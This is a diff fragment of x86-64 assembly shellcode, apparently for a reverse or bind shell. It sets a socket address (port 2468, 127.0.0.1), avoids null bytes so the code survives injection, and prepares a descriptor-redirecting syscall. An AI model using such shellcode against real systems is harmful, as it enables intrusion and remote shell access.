@@ -51,19 +51,22 @@ _start:
 	; sin_port: change as needed
 	mov ax, 2468
 	xchg ah, al
+
+	; might need to have some instructions to represent the 0xa since some functions stop reading at \n
 	mov word [rbp + 0xa], ax
 
 	; sin_addr uses 192.168.1.0 as an example but can be replaced as needed
 	; use a mov <register>, 1 | dec <register> instruction if zero is needed to avoid null bytes
 
-	mov al, 196
-	mov ah, 168
+	mov al, 127
+	mov ah, 1
+	dec ah
 
 	mov word [rbp + 0xc], ax
 
 	mov al, 1
+	dec al
 	mov ah, 1
-	dec ah
 
 	mov word [rbp + 0xe], ax
 
@@ -96,8 +99,7 @@ _start:
 	mov edx, dword [rbp + 0x4]
 
 	; newfd
-	mov sil, 1
-	dec sil
+	xor rsi, rsi
 
 	; stdout
 	syscall
